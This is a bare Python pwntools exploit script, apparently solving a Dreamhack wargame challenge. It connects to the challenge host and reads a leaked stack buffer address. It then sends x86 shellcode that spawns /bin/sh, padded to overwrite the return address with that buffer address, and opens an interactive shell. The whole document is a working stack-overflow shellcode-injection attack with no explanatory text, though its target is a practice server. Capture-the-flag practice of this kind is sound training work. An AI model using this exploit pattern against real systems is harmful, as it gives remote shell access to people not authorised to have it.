from pwn import *
p = remote('host3.dreamhack.games', 16708)
shellcode = b'\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x31\xC9\x31\xD2\xB0\x08\x04\x03\xCD\x80'


p.recvuntil(b'(')
buf = int(p.recv(10), 16)
print(f"buf: {hex(buf)}")
p.recvuntil(b')')
payload = shellcode.ljust(132, b'A') + p32(buf)
p.send(payload)
p.interactive()
